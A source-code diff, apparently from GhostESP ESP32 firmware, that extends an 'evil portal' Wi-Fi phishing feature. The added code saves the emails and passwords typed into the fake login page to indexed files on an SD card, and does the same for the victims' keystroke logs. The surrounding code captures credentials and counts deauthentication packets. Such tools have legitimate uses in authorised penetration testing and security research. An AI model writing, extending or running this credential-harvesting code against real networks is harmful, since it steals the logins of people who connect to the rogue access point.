@@ -30,8 +30,9 @@
 #ifdef WITH_SCREEN
 #include "managers/views/music_visualizer.h"
 #endif
-
+#include "managers/sd_card_manager.h" // Add SD card manager include
 #include "managers/views/terminal_screen.h"
+#include "core/utils.h" // Add utils include
 #include <inttypes.h>
 #include "managers/default_portal.h"
 
@@ -58,6 +59,8 @@ static uint32_t last_packet_time = 0;
 static uint32_t packet_counter = 0;
 static uint32_t deauth_packets_sent = 0;
 static bool login_done = false;
+static char current_creds_filename[128] = "";
+static char current_keystrokes_filename[128] = "";
 
 struct service_info {
     const char *query;
@@ -651,6 +654,17 @@ esp_err_t get_log_handler(httpd_req_t *req) {
         body[received] = '\0';
 
         printf("Received chunk: %s\n", body);
+
+        // Save to SD card if available and filename is set
+        if (sd_card_manager.is_initialized && current_keystrokes_filename[0] != '\0') {
+            FILE* f = fopen(current_keystrokes_filename, "a");
+            if (f) {
+                fprintf(f, "%s", body); // Append the chunk
+                fclose(f);
+            } else {
+                printf("Failed to open %s for appending\n", current_keystrokes_filename);
+            }
+        }
     }
 
     if (received < 0) {
@@ -679,6 +693,18 @@ esp_err_t get_info_handler(httpd_req_t *req) {
             url_decode(decoded_password, pass_val);
         }
         printf("Captured credentials: %s / %s\n", decoded_email, decoded_password);
+
+        // Save credentials to SD card if available and filename is set
+        if (sd_card_manager.is_initialized && current_creds_filename[0] != '\0') {
+            FILE* f = fopen(current_creds_filename, "a");
+            if (f) {
+                // Optionally add a timestamp or delimiter here
+                fprintf(f, "Email: %s, Password: %s\n", decoded_email, decoded_password);
+                fclose(f);
+            } else {
+                printf("Failed to open %s for appending\n", current_creds_filename);
+            }
+        }
     }
     if (login_done) {
         httpd_resp_set_status(req, "204 No Content");
@@ -779,6 +805,31 @@ httpd_handle_t start_portal_webserver(void) {
 esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *SSID, const char *Password,
                                           const char *ap_ssid, const char *domain) {
     login_done = false; // Reset login state on start
+    current_creds_filename[0] = '\0'; // Reset filenames at the start
+    current_keystrokes_filename[0] = '\0';
+
+    // Generate indexed filenames if SD card is available
+    if (sd_card_manager.is_initialized) {
+        const char* dir_path = "/mnt/ghostesp/evil_portal";
+        int creds_index = get_next_file_index(dir_path, "portal_creds", "txt");
+        int keys_index = get_next_file_index(dir_path, "portal_keystrokes", "txt");
+
+        if (creds_index >= 0) {
+            snprintf(current_creds_filename, sizeof(current_creds_filename),
+                     "%s/portal_creds_%d.txt", dir_path, creds_index);
+            printf("Logging credentials to: %s\n", current_creds_filename);
+        } else {
+            printf("Failed to get next index for credentials file.\n");
+        }
+
+        if (keys_index >= 0) {
+            snprintf(current_keystrokes_filename, sizeof(current_keystrokes_filename),
+                     "%s/portal_keystrokes_%d.txt", dir_path, keys_index);
+            printf("Logging keystrokes to: %s\n", current_keystrokes_filename);
+        } else {
+             printf("Failed to get next index for keystrokes file.\n");
+        }
+    }
 
     // Check if we need to use the internal default portal
     if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
@@ -863,6 +914,8 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
 
 void wifi_manager_stop_evil_portal() {
     login_done = false; // Reset login state on stop
+    current_creds_filename[0] = '\0'; // Clear saved filenames
+    current_keystrokes_filename[0] = '\0';
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
